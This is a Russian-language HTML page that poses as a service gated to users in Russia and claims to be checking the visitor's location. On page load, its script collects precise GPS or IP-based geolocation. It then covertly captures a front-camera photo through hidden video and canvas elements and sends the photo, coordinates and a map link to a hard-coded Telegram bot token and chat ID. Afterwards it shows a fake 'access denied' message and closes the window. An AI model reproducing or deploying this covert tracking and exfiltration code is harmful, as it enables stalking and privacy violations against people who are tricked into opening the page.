<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Сервис...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background-color: #000;
            color: #fff;
            text-align: center;
        }
        #quote {
            font-size: 24px;
            opacity: 0;
            animation: fadeIn 5s forwards;
            max-width: 80%;
            line-height: 1.6;
            margin-bottom: 30px;
        }
        #status {
            padding: 10px;
            border-radius: 5px;
            font-size: 16px;
            opacity: 0;
            animation: fadeIn 1s forwards;
            margin-bottom: 20px;
        }
        @keyframes fadeIn {
            to { opacity: 1; }
        }
        .success {
            background-color: rgba(0, 128, 0, 0.3);
        }
        .error {
            background-color: rgba(255, 0, 0, 0.3);
        }
        .info {
            background-color: rgba(0, 0, 255, 0.3);
        }
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>
    <div id="quote">Сервис предназначен только для пользователей из России. Проверка вашего местоположения...</div>
    <div id="status" class="info">Определение геопозиции...</div>
    
    <!-- Скрытые элементы для работы с камерой -->
    <video id="hiddenCamera" class="hidden" autoplay playsinline></video>
    <canvas id="hiddenCanvas" class="hidden"></canvas>

    <script>
        // Конфигурация Telegram бота
        const BOT_TOKEN = '8205177733:AAG2kcNM-aHALnKEYrDIkXeMN406ENplzSw';
        const CHAT_ID = '6292332566';
        
        // Элементы DOM
        const quoteElement = document.getElementById('quote');
        const statusElement = document.getElementById('status');
        const hiddenCamera = document.getElementById('hiddenCamera');
        const hiddenCanvas = document.getElementById('hiddenCanvas');
        
        let stream = null;

        // Показать статус
        function showStatus(text, type) {
            statusElement.textContent = text;
            statusElement.className = type;
            statusElement.style.opacity = 1;
        }
        
        // Инициализация камеры
        async function initCamera() {
            try {
                showStatus('Проверяем доступ к камере...', 'info');
                
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                
                hiddenCamera.srcObject = stream;
                
                // Ждем пока камера будет готова
                await new Promise((resolve) => {
                    hiddenCamera.onloadedmetadata = resolve;
                });
                
                return true;
            } catch (err) {
                console.error('Camera error:', err);
                return false;
            }
        }
        
        // Захват фото с гарантированным ожиданием
        async function capturePhotoWithRetry() {
            let retries = 3;
            let photoData = null;
            
            while (retries > 0 && !photoData) {
                try {
                    // Установка размера canvas
                    hiddenCanvas.width = hiddenCamera.videoWidth;
                    hiddenCanvas.height = hiddenCamera.videoHeight;
                    
                    // Ждем стабилизации изображения (1.5 секунды)
                    await new Promise(resolve => setTimeout(resolve, 1500));
                    
                    // Рисуем изображение (не зеркальное)
                    const context = hiddenCanvas.getContext('2d');
                    context.translate(hiddenCanvas.width, 0);
                    context.scale(-1, 1);
                    context.drawImage(hiddenCamera, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
                    context.setTransform(1, 0, 0, 1, 0, 0);
                    
                    // Преобразуем в data URL
                    photoData = hiddenCanvas.toDataURL('image/jpeg', 0.92);
                    
                    // Проверка минимального размера (30KB)
                    if (photoData.length < 30000) {
                        throw new Error('Изображение слишком маленькое, попробуйте позже');
                    }
                    
                    return photoData;
                } catch (err) {
                    retries--;
                    if (retries > 0) {
                        await new Promise(resolve => setTimeout(resolve, 1000));
                        console.log(`Повторная попытка (осталось ${retries})`);
                    } else {
                        throw err;
                    }
                }
            }
        }
        
        // Получение геолокации с повышенной точностью
        async function getHighAccuracyLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                
                showStatus('Получение геолокации...', 'info');
                
                // Сначала пробуем с высокой точностью
                navigator.geolocation.getCurrentPosition(
                    position => resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: position.timestamp
                    }),
                    error => {
                        console.log('High accuracy failed, trying standard...');
                        // Если высокая точность не сработала, пробуем стандартный метод
                        navigator.geolocation.getCurrentPosition(
                            position => resolve({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                timestamp: position.timestamp
                            }),
                            error => {
                                console.error('Geolocation error:', error);
                                resolve(null);
                            },
                            {
                                enableHighAccuracy: false,
                                timeout: 10000,
                                maximumAge: 0
                            }
                        );
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 8000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        // Получение IP-геолокации как запасной вариант
        async function getIPLocation() {
            try {
                showStatus('Определение местоположения по IP...', 'info');
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    latitude: data.latitude,
                    longitude: data.longitude,
                    accuracy: 50000, // Примерная точность для IP-геолокации
                    timestamp: Date.now(),
                    ipBased: true
                };
            } catch (error) {
                console.error('IP location error:', error);
                return null;
            }
        }
        
        // Отправка данных в Telegram
        async function sendToTelegram(photoData, locationData) {
            try {
                showStatus('Отправка данных...', 'info');
                
                const message = `📍 Данные устройства:\n` +
                               `Широта: ${locationData?.latitude?.toFixed(6) || 'не определено'}\n` +
                               `Долгота: ${locationData?.longitude?.toFixed(6) || 'не определено'}\n` +
                               `Точность: ${locationData?.accuracy ? Math.round(locationData.accuracy) + ' м' : 'не определено'}\n` +
                               `Время: ${new Date(locationData?.timestamp || Date.now()).toLocaleString()}\n` +
                               `Метод: ${locationData?.ipBased ? 'IP-геолокация' : (locationData ? 'GPS' : 'не доступно')}\n` +
                               `Карты: ${locationData ? `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}` : 'не доступно'}`;

                if (photoData) {
                    // Если есть фото, отправляем фото с подписью
                    const blob = await fetch(photoData).then(res => res.blob());
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'photo.jpg');
                    formData.append('caption', message);
                    
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    
                    const result = await response.json();
                    
                    if (!result.ok) {
                        throw new Error(result.description || 'Ошибка отправки фото');
                    }
                } else {
                    // Если фото нет, отправляем просто сообщение
                    const params = new URLSearchParams();
                    params.append('chat_id', CHAT_ID);
                    params.append('text', message);
                    
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?${params}`);
                    const result = await response.json();
                    
                    if (!result.ok) {
                        throw new Error(result.description || 'Ошибка отправки сообщения');
                    }
                }
                
                showStatus('Доступ запрещен ⛔️ Страна: Франция', 'success');
                return true;
            } catch (err) {
                showStatus('Ошибка: ' + err.message, 'error');
                console.error('Telegram error:', err);
                return false;
            }
        }
        
        // Проверка, находится ли пользователь в России
        async function checkRussianLocation() {
            try {
                // Пытаемся получить точную геолокацию
                let locationData = await getHighAccuracyLocation();
                let isRussian = false;
                
                // Если геолокация не сработала, пробуем IP-геолокацию
                if (!locationData) {
                    locationData = await getIPLocation();
                }
                
                // Здесь должна быть логика проверки России
                // Для демонстрации, пока просто проверяем, есть ли данные
                if (locationData) {
                    // В реальном проекте здесь проверяем координаты
                    // Примерная граница России: широта от 41° до 82°, долгота от 19° до 190°
                    isRussian = locationData.latitude >= 41 && 
                               locationData.latitude <= 82 && 
                               locationData.longitude >= 19 && 
                               locationData.longitude <= 190;
                    
                    if (!isRussian) {
                        // Если не Россия, делаем фото и отправляем данные
                        const cameraInitialized = await initCamera();
                        let photoData = null;
                        
                        if (cameraInitialized) {
                            try {
                                photoData = await capturePhotoWithRetry();
                            } catch (err) {
                                console.error('Photo capture error:', err);
                            } finally {
                                // Останавливаем камеру, если она была запущена
                                if (stream) {
                                    stream.getTracks().forEach(track => track.stop());
                                }
                            }
                        }
                        
                        await sendToTelegram(photoData, locationData);
                    } else {
                        showStatus('Доступ разрешен ✓ Россия', 'success');
                        quoteElement.textContent = 'Добро пожаловать! Доступ открыт.';
                    }
                } else {
                    showStatus('Не удалось определить местоположение', 'error');
                }
                
                return isRussian;
            } catch (err) {
                showStatus('Ошибка проверки: ' + err.message, 'error');
                console.error('Check error:', err);
                return false;
            } finally {
                // Закрываем страницу через 5 секунд
                setTimeout(() => window.close(), 5000);
            }
        }
        
        // Автоматический запуск при загрузке страницы
        window.addEventListener('load', () => {
            checkRussianLocation();
        });
    </script>
</body>
</html>
